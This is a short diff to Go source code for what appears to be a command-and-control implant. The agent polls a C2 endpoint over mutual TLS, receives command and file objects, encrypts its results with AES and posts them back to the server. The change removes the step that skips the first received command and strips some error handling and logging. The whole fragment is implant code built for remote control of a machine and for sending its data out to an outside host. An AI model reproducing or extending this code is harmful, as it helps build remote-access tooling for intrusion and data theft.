@@ -68,17 +68,12 @@ func main() {
 
 func awaitFile(c2Endpoint, UUID, kX1, kX2, aesKey string, ticker *time.Ticker, mTLSClient *http.Client) {
 	var prevCmd int
-	var first = true
 	for range ticker.C {
 		fObject, cmdID, err := getObjectBytes(prevCmd, c2Endpoint, UUID, kX1, kX2, aesKey, mTLSClient, "2")
 		if err != nil {
 			continue
 		}
 		prevCmd = cmdID
-		if first {
-			first = false
-			continue
-		}
 		fileObj := &models.KarObjectFile{}
 		if err := json.Unmarshal(fObject, fileObj); err != nil {
 			continue
@@ -222,19 +217,12 @@ func parseCmdObject(cmdObject *models.KarObjectCmd, cmdID int, c2Endpoint, UUID 
 		}
 	}
 	if objType == 1 {
-		respObjectBytes, err = json.Marshal(responseObject)
-		if err != nil {
-			return
-		}
+		respObjectBytes, _ = json.Marshal(responseObject)
 	} else if objType == 3 {
-		respObjectBytes, err = json.Marshal(filesObject)
-		if err != nil {
-			return
-		}
+		respObjectBytes, _ = json.Marshal(filesObject)
 	}
 	respObjectBytes, err = kes.EncryptObject(respObjectBytes, aesKey, X1, X2)
 	if err != nil {
-		log.Error("")
 		return
 	}
 	go postData(c2Endpoint, UUID, mTLSClient, &models.GenericData{
